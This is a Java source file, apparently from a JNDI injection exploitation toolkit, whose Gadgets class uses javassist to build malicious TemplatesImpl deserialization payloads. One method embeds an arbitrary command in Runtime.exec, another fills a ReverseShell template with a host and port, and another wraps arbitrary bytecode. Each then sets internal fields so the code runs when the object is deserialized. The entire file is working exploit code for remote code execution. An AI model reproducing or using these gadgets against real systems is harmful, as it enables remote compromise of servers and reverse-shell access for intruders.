package map.jndi.gadget;

import map.jndi.template.ReverseShell;
import map.jndi.util.MiscUtil;
import map.jndi.util.ReflectUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import javassist.bytecode.AccessFlag;
import javassist.bytecode.ClassFile;

import java.io.ByteArrayInputStream;

public class Gadgets {
    public static TemplatesImpl create(String command) throws Exception {
        ClassPool pool = ClassPool.getDefault();

        String body = String.format("java.lang.Runtime.getRuntime().exec(\"%s\");", command);

        ClassFile classFile = new ClassFile(false, MiscUtil.getClassName(), null);
        classFile.setMajorVersion(ClassFile.JAVA_8);
        classFile.setAccessFlags(AccessFlag.PUBLIC);
        CtClass clazz = pool.makeClass(classFile);

        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setModifiers(Modifier.PUBLIC);
        constructor.setBody(body);
        clazz.addConstructor(constructor);

        return makeTemplatesImpl(clazz.toBytecode());
    }

    public static TemplatesImpl create(String host, int port) throws Exception {
        ClassPool pool = ClassPool.getDefault();

        CtClass clazz = pool.get(ReverseShell.class.getName());
        ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
        ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(port));
        clazz.replaceClassName(clazz.getName(), MiscUtil.getClassName());

        return makeTemplatesImpl(clazz.toBytecode());
    }

    public static TemplatesImpl create(byte[] bytecode) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass(new ByteArrayInputStream(bytecode));

        return makeTemplatesImpl(clazz.toBytecode());
    }

    public static TemplatesImpl makeTemplatesImpl(byte[] bytecode) throws Exception {
        TemplatesImpl templatesImpl = new TemplatesImpl();

        ReflectUtil.setFieldValue(templatesImpl, "_name", "Hello");
        ReflectUtil.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytecode, makeDummyClass()});
        ReflectUtil.setFieldValue(templatesImpl, "_transletIndex", 0);

        return templatesImpl;
    }

    public static byte[] makeDummyClass() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass(MiscUtil.getClassName());

        return clazz.toBytecode();
    }
}
